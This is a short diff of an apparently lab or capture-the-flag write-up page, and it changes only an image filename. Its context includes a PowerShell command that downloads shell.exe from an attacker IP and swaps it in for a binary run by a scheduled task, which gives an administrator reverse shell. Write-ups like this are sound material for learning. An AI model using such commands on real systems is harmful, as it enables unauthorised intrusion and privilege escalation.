@@ -149,6 +149,6 @@ powershell -c wget 192.168.45.161/shell.exe -Outfile TFTP.EXE
 
 After a few minutes, the task would execute and give us a administrator reverse shell.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (152) (6).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
